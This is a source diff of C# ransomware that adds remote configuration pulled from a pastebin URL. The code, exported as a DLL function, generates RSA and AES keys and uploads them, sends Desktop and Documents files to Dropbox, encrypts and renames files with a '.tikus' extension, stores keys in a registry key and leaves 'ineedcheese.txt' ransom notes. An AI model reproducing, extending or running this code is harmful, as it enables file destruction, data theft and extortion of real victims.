@@ -16,6 +16,9 @@ using Org.BouncyCastle.Security;
 using System.Security.Principal;
 using Microsoft.Win32;
 using PgpCore;
+using Salaros.Configuration;
+using System.Globalization;
+using System.Net;
 
 namespace Program
 {
@@ -283,10 +286,11 @@ namespace Program
             return key;
         }
     }
-
     
     public class Program
     {
+        static WebClient webClient = new WebClient();
+
         public static byte[] Compress(byte[] data)
         {
             MemoryStream output = new MemoryStream();
@@ -295,6 +299,34 @@ namespace Program
                 dstream.Write(data, 0, data.Length);
             }
             return output.ToArray();
+        }
+
+        public static string GetConfigFile()
+        {
+            var iniFile = "";
+            var configFileUrl = @"https://pastebin.com/raw/zFaCXP04";
+            //TLS / SSL fix for old Net WebClient
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+
+            //headers needed for the github API to answer back
+            webClient.Headers.Set("User-Agent", "request");
+
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            try
+            {
+                iniFile = webClient.DownloadString(configFileUrl);
+                if(string.IsNullOrEmpty(iniFile))
+                {
+                    Environment.Exit(0);
+                }
+            }
+            catch
+            {
+                Console.WriteLine("[!] No internet");
+                Environment.Exit(0);
+            }
+            return iniFile;
         }
 
         public static string GenKeyPairs()
@@ -428,16 +460,25 @@ sKB2dDA=
 -----END PGP PUBLIC KEY BLOCK-----
 ";
 
+        public static ConfigParser GetConfig = new ConfigParser(GetConfigFile(), new ConfigParserSettings
+        {
+            MultiLineValues = MultiLineValues.Simple | MultiLineValues.AllowValuelessKeys | MultiLineValues.QuoteDelimitedValues,
+            Culture = new CultureInfo("en-US")
+        });
+
         //https://stackoverflow.com/questions/19570611/how-to-ignore-an-exception-and-continue-processing-a-foreach-loop
         public static readonly string userName = Environment.UserName;
         public static readonly string uid = $"{Environment.MachineName}-{Environment.UserName}";
+        public static string ransomFormat = GetConfig.GetValue("General", "ransomFormat").Trim();
+        private static string baseDir = GetConfig.GetValue("General", "baseDir").Trim();
+        private static readonly bool dropTikus = GetConfig.GetValue("General", "dropTikus", false);
+        //private static string baseDir = $@"C:\Users\{userName}\Desktop\aniqfakhrul";
 
         private static Dictionary<DirectoryInfo, List<string>> validDirs = new Dictionary<DirectoryInfo, List<string>>();
         private static List<string> logger = new List<string>();
 
-        private static List<string> uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32", "AppData", "Windows" };
-        private static List<string> whitelistExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll", "pdb", "ini" };
-        private static string baseDir = $@"C:\Users\{userName}\Desktop\aniqfakhrul";
+        private static List<string> uselessFilesAndFolders = new List<string>(GetConfig.GetArrayValue("Exceptions", "uselessFilesAndFolders"));
+        private static List<string> whitelistExtensions = new List<string>(GetConfig.GetArrayValue("Exceptions", "whitelistExtensions"));
 
         static void RecursiveSearch(string root)
         {
@@ -471,8 +512,6 @@ sKB2dDA=
             }
         }
 
-
-
         //method to check
         static bool isExcluded(List<string> exludedDirList, string target)
         {
@@ -483,135 +522,134 @@ sKB2dDA=
         [DllExport]
         public static void DllGetClassObject()
         {
-            //start firefox
-            //StartProcess("firefox.exe");
-
-            var ransomFormat = ".tikus";
-
-            var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-
-            var folderToExtract = new List<string> { userDesktopPath, "Documents" };
-
-            //var SPubKey = PemToXml("-----BEGIN PUBLIC KEY-----\r\n" + SPubKeyOneLine + "\r\n-----END PUBLIC KEY-----");
-
-            if (Directory.Exists(baseDir))
+            if (dropTikus)
             {
-                //generate key pairs
-                //var publicKey = GenKeyPairs();
-                Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);
+                //start firefox
+                //StartProcess("firefox.exe");
 
-                //now encrypt client's private key
-                var encCPrivKey = string.Empty;
-                MemoryStream inputFileStream = new MemoryStream(Encoding.UTF8.GetBytes(privateKey));
-                MemoryStream publicKeyStream = new MemoryStream(Encoding.UTF8.GetBytes(SPubKey));
-                var tempFile = $@"C:\Windows\Tasks\{Random.GenerateRandomString()}.pgp";
-                using (PGP pgp = new PGP())
+                var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                var folderToExtract = new List<string> { userDesktopPath, "Documents" };
+
+                //var SPubKey = PemToXml("-----BEGIN PUBLIC KEY-----\r\n" + SPubKeyOneLine + "\r\n-----END PUBLIC KEY-----");
+
+                if (Directory.Exists(baseDir))
                 {
-                    using (Stream outputFileStream = File.Create(tempFile))
+                    //generate key pairs
+                    //var publicKey = GenKeyPairs();
+                    Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);
+
+                    //now encrypt client's private key
+                    var encCPrivKey = string.Empty;
+                    MemoryStream inputFileStream = new MemoryStream(Encoding.UTF8.GetBytes(privateKey));
+                    MemoryStream publicKeyStream = new MemoryStream(Encoding.UTF8.GetBytes(SPubKey));
+                    var tempFile = $@"C:\Windows\Tasks\{Random.GenerateRandomString()}.pgp";
+                    using (PGP pgp = new PGP())
                     {
-                        pgp.EncryptStream(inputFileStream, outputFileStream, publicKeyStream, true, true);
-                        outputFileStream.Close();
-                        encCPrivKey = File.ReadAllText(tempFile);
-                        File.Delete(tempFile);
-                    }
-                }
-
-                //var encPrivKey = Asymmetric.RSA.Encrypt(privateKey, SPubKey);
-                //var b64encPrivKey = Convert.ToBase64String(Encoding.UTF8.GetBytes(encPrivKey));
-                //Console.WriteLine(b64encPrivKey);
-                UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key", uid);
-
-                byte[] aes_key = Random.GetRandomKey();
-                byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);
-
-                byte[] aes_iv = Random.GetRandomIV();
-                byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);
-
-                //var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories).Where(d => !isExcluded(uselessFilesAndFolders, d));
-
-                byte[] encrypted;
-
-                //write aes_key and aes_iv
-                //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
-                //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);
-
-                if (IsElevated)
-                {
-                    //insert into reg key
-                    RegistryKey LocalReg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\FreePalestine");
-                    LocalReg.SetValue("aesKey", encAesKey);
-                    LocalReg.SetValue("aesIV", encIVKey);
-                    LocalReg.SetValue("encCPubKey", publicKey);
-                    LocalReg.SetValue("encCPrivKey", encCPrivKey);
-                    LocalReg.SetValue("encSPubKey", SPubKey);
-
-                }
-
-                //write symmetic key
-                UploadKeys(encAesKey, "aes.key", uid);
-                //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
-                UploadKeys(encIVKey, "aes.iv", uid);
-                //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);
-
-                RecursiveSearch(baseDir);
-
-                foreach (var listFiles in validDirs.Values)
-                {
-                    foreach(var file in listFiles)
-                    {
-                        var newFileExtension = $"{file}{ransomFormat}";
-                        var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
-
-                        if (!file.EndsWith(ransomFormat))
+                        using (Stream outputFileStream = File.Create(tempFile))
                         {
-                            if(!uselessFilesAndFolders.Any(x => file.Contains(x)))
-                            {
-                                try
-                                {
-                                    //Console.WriteLine($"Full {file}");
-                                    var outFolder = Path.Combine(uid, Path.GetDirectoryName(file).Replace(baseDir, "").Trim('\\'));
-                                    outFolder = outFolder.Replace("\\", "/");
-                                    //Console.WriteLine($"ALtered: {outFolder}");
-                                    var fileContent = File.ReadAllBytes(file);
-
-                                    if (folderToExtract.Any(i => file.Contains(i)))
-                                    {
-                                        //upload file to google drive (do in background)
-                                        var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
-                                        task.Wait();
-                                    }
-
-                                    //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
-                                    encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
-
-                                    File.WriteAllBytes(file, encrypted);
-
-                                    File.Move(file, newFileExtension);
-
-                                    if (!File.Exists(ransomNotePath))
-                                        LeaveRansomNote(ransomNotePath, encCPrivKey);
-
-                                }
-                                catch
-                                {
-
-                                }
-                            }
-
+                            pgp.EncryptStream(inputFileStream, outputFileStream, publicKeyStream, true, true);
+                            outputFileStream.Close();
+                            encCPrivKey = File.ReadAllText(tempFile);
+                            File.Delete(tempFile);
                         }
                     }
-                    
 
-                    
+                    //var encPrivKey = Asymmetric.RSA.Encrypt(privateKey, SPubKey);
+                    //var b64encPrivKey = Convert.ToBase64String(Encoding.UTF8.GetBytes(encPrivKey));
+                    //Console.WriteLine(b64encPrivKey);
+                    UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key", uid);
 
+                    byte[] aes_key = Random.GetRandomKey();
+                    byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);
+
+                    byte[] aes_iv = Random.GetRandomIV();
+                    byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);
+
+                    //var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories).Where(d => !isExcluded(uselessFilesAndFolders, d));
+
+                    byte[] encrypted;
+
+                    //write aes_key and aes_iv
+                    //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
+                    //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);
+
+                    if (IsElevated)
+                    {
+                        //insert into reg key
+                        RegistryKey LocalReg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\FreePalestine");
+                        LocalReg.SetValue("aesKey", encAesKey);
+                        LocalReg.SetValue("aesIV", encIVKey);
+                        LocalReg.SetValue("encCPubKey", publicKey);
+                        LocalReg.SetValue("encCPrivKey", encCPrivKey);
+                        LocalReg.SetValue("encSPubKey", SPubKey);
+
+                    }
+
+                    //write symmetic key
+                    UploadKeys(encAesKey, "aes.key", uid);
+                    //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
+                    UploadKeys(encIVKey, "aes.iv", uid);
+                    //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);
+
+                    RecursiveSearch(baseDir);
+
+                    foreach (var listFiles in validDirs.Values)
+                    {
+                        foreach (var file in listFiles)
+                        {
+                            var newFileExtension = $"{file}{ransomFormat}";
+                            var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
+
+                            if (!file.EndsWith(ransomFormat))
+                            {
+                                if (!uselessFilesAndFolders.Any(x => file.Contains(x)))
+                                {
+                                    try
+                                    {
+                                        //Console.WriteLine($"Full {file}");
+                                        var outFolder = Path.Combine(uid, Path.GetDirectoryName(file).Replace(baseDir, "").Trim('\\'));
+                                        outFolder = outFolder.Replace("\\", "/");
+                                        //Console.WriteLine($"ALtered: {outFolder}");
+                                        var fileContent = File.ReadAllBytes(file);
+
+                                        if (folderToExtract.Any(i => file.Contains(i)))
+                                        {
+                                            //upload file to google drive (do in background)
+                                            var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
+                                            task.Wait();
+                                        }
+
+                                        //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
+                                        encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
+
+                                        File.WriteAllBytes(file, encrypted);
+
+                                        File.Move(file, newFileExtension);
+
+                                        if (!File.Exists(ransomNotePath))
+                                            LeaveRansomNote(ransomNotePath, encCPrivKey);
+
+                                    }
+                                    catch
+                                    {
+
+                                    }
+                                }
+
+                            }
+                        }
+
+
+
+
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Not found");
                 }
             }
-            else
-            {
-                Console.WriteLine("Not found");
-            }
-
-
         }
     }
 }
